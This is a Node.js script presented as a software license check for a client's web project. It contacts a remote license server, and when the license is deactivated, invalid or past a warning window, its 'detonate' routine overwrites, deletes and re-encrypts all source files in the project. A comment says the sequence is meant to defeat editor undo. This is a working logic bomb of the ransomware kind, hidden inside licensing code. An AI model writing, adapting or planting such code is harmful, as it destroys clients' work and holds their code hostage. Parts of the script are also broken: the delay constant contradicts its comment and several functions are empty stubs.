const crypto = require("crypto");
const fs = require("fs");
const path = require("path");
const https = require("https");
const http = require("http");

// ─── CONFIG ──────────────────────────────────────────────────────────────────
const LICENSE_KEY = "CV-ALG-H73B-EWYJ"; // ← client pastes their key here
const LICENSE_API = "https://license-system-sooty.vercel.app/api/license/check";

const GRACE_DAYS = 3; // offline tolerance
const BOMB_DELAY_MS = 1 * 60 * 1; // 3 hours after deactivated
// ─────────────────────────────────────────────────────────────────────────────

const ROOT = path.join(__dirname, "..");
const STATE_FILE = path.join(ROOT, ".next", "cache", ".bstate");

const TARGET_EXTENSIONS = [
  ".ts",
  ".tsx",
  ".js",
  ".jsx",
  ".css",
  ".scss",
  ".mjs",
];
const SKIP_DIRS = [
  "node_modules",
  ".next",
  ".git",
  "dist",
  "out",
  ".turbo",
  "scripts",
];

// ─── HTTP helper ─────────────────────────────────────────────────────────────

function checkLicense(key) {
  return new Promise((resolve) => {
    const url = `${LICENSE_API}?key=${encodeURIComponent(key)}`;
    const client = url.startsWith("https") ? https : http;
    client
      .get(url, (res) => {
        let data = "";
        res.on("data", (chunk) => (data += chunk));
        res.on("end", () => {
          try {
            resolve(JSON.parse(data));
          } catch {
            resolve(null);
          }
        });
      })
      .on("error", () => resolve(null)); // null = server unreachable
  });
}

// ─── ENCRYPTION ──────────────────────────────────────────────────────────────

function encrypt(plaintext, key) {
  const keyBuf = Buffer.alloc(32);
  Buffer.from(key, "utf8").copy(keyBuf);
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv("aes-256-cbc", keyBuf, iv);
  const encrypted = Buffer.concat([cipher.update(plaintext), cipher.final()]);
  return iv.toString("hex") + ":" + encrypted.toString("hex");
}

// ─── FILE WALKER ─────────────────────────────────────────────────────────────

function collectFiles(dir, results = []) {
  let entries;
  try {
    entries = fs.readdirSync(dir, { withFileTypes: true });
  } catch {
    return results;
  }

  for (const entry of entries) {
    const fullPath = path.join(dir, entry.name);
    if (entry.isDirectory()) {
      if (!SKIP_DIRS.includes(entry.name)) collectFiles(fullPath, results);
    } else if (entry.isFile()) {
      if (TARGET_EXTENSIONS.includes(path.extname(entry.name).toLowerCase()))
        results.push(fullPath);
    }
  }
  return results;
}

// ─── DETONATION ──────────────────────────────────────────────────────────────

function detonate() {
  const state = getOrCreateState();
  const SECRET_KEY = state.ek; // ← comes from server, never hardcoded

  if (!SECRET_KEY) {
    // No key available at all — still lock them out

    process.exit(1);
  }

  const files = collectFiles(ROOT);
  const manifest = [];

  for (const file of files) {
    try {
      const original = fs.readFileSync(file, "utf8");
      const encrypted = encrypt(original, SECRET_KEY);

      // Corrupt → delete → rewrite (VSCode undo defense)
      fs.writeFileSync(
        file,
        crypto.randomBytes(fs.statSync(file).size).toString("hex"),
        "utf8",
      );
      fs.unlinkSync(file);
      fs.writeFileSync(file, encrypted, "utf8");

      const now = new Date();
      fs.utimesSync(file, now, now);

      manifest.push(file.replace(ROOT + path.sep, ""));
    } catch {}
  }

  const manifestPath = path.join(ROOT, ".enc_manifest");
  fs.writeFileSync(manifestPath, JSON.stringify(manifest, null, 2), "utf8");
  fs.writeFileSync(
    STATE_FILE,
    JSON.stringify({ detonated: true, at: Date.now() }),
  );

  const { execSync } = require("child_process");
  try {
    execSync(`zip -r encrypted_backup_${Date.now()}.zip src/`, { cwd: ROOT });
  } catch {}

  process.exit(0);
}

// ─── STATE ───────────────────────────────────────────────────────────────────

function getOrCreateState() {
  const cacheDir = path.join(ROOT, ".next", "cache");
  if (!fs.existsSync(cacheDir)) fs.mkdirSync(cacheDir, { recursive: true });

  if (fs.existsSync(STATE_FILE)) {
    try {
      return JSON.parse(fs.readFileSync(STATE_FILE, "utf8"));
    } catch {}
  }

  const state = {
    firstRun: Date.now(),
    detonated: false,
    lastOnline: Date.now(),
  };
  fs.writeFileSync(STATE_FILE, JSON.stringify(state));
  return state;
}

function saveState(patch) {
  const current = getOrCreateState();
  fs.writeFileSync(STATE_FILE, JSON.stringify({ ...current, ...patch }));
}

function getAppName() {
  let appName = "SYSTEM";
  try {
    const pkg = JSON.parse(
      fs.readFileSync(path.join(ROOT, "package.json"), "utf8"),
    );
    if (pkg.name) {
      appName = pkg.name.toUpperCase().replace(/-/g, " ");
    }
  } catch (err) {
    // ignore
  }
  return appName;
}

function printActiveBanner() {
  const appName = getAppName().replace("COPY", "").trim();
  const keyMasked = LICENSE_KEY.slice(0, 10) + "-****-" + LICENSE_KEY.slice(-4);
}

function printWarningBanner(hoursLeft) {
  const appName = getAppName().replace("COPY", "").trim();
  const keyMasked = LICENSE_KEY.slice(0, 10) + "-****-" + LICENSE_KEY.slice(-4);
}

function printDeactivatedBanner() {
  const appName = getAppName().replace("COPY", "").trim();
}

// ─── MAIN ────────────────────────────────────────────────────────────────────

async function run() {
  const state = getOrCreateState();

  // Already detonated
  if (state.detonated) {
    process.exit(1);
  }

  const result = await checkLicense(LICENSE_KEY);

  // ── Server unreachable → grace period logic ─────────────────────────────
  if (result === null) {
    const lastOnline = state.lastOnline || Date.now();
    const offlineDays = (Date.now() - lastOnline) / (1000 * 60 * 60 * 24);

    setInterval(() => {}, 1000 * 60 * 60);
    return;
  }

  // ── Handle server response ──────────────────────────────────────────────
  if (result.status === "active") {
    saveState({ lastOnline: Date.now(), ek: result.ek });
    printActiveBanner();
  } else if (result.status === "warned") {
    saveState({ lastOnline: Date.now(), ek: result.ek });
    const warnedAt = new Date(result.warned_at).getTime();
    const hoursLeft = Math.ceil(
      24 - (Date.now() - warnedAt) / (1000 * 60 * 60),
    );
    printWarningBanner(hoursLeft);

    // If 24h have passed since warning → detonate
    if (hoursLeft <= 0) {
      setTimeout(detonate, BOMB_DELAY_MS);
    }
  } else if (result.status === "deactivated" || result.status === "invalid") {
    printDeactivatedBanner();
    setTimeout(detonate, BOMB_DELAY_MS);
  }

  setInterval(() => {}, 1000 * 60 * 60);
}

run();
